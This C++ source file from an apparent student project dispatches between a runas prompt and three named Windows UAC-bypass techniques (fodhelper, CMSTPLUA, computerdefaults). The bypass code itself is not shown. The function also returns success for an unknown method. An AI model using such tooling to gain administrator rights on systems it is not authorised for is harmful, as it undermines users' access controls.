/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   privesc.cpp                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/08/24 02:17:51 by zcadinot          #+#    #+#             */
/*   Updated: 2026/08/24 06:35:40 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "privesc.hpp"

bool elevate_privileges(method meto)
{
    if (is_admin())
    {
        return (true);
    }
    if (meto == RUNAS)
    {
        return (elevate_runas());
    }
    if (meto == FODHELPER)
    {
        return (elevate_fodhelper());
    }
    if (meto == CMSTPLUA)
    {
        return (elevate_cmstplua());
    }
    if (meto == COMPUTERDEFAULTS)
    {
        return (elevate_computerdefaults());
    }
    return (true);
}
